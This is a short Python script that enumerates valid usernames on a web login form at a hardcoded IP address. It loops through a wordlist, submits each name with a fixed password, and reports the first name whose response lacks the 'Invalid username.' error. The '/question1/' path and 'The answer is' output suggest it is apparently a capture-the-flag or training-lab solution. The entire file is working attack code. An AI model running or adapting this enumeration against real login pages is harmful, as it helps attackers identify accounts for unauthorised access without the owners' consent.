import requests 
import re  

url = "http://46.101.60.26:31068/question1/"

session = requests.Session()
with open("top-usernames-shortlist.txt", "r") as f:
	wordlist = f.readlines()

for word in wordlist:
	word = word.rstrip()
	params = {
		"Username": word,
		"Password": "qwerasdf"
	}
	r = session.get(url, params=params)
	invalid_name = re.findall(r'Invalid username\.', r.text)
	if len(invalid_name) > 0:
		print(f"[x] Testing {word}")
	else:
		print(f"[!] The answer is {word}")
		break
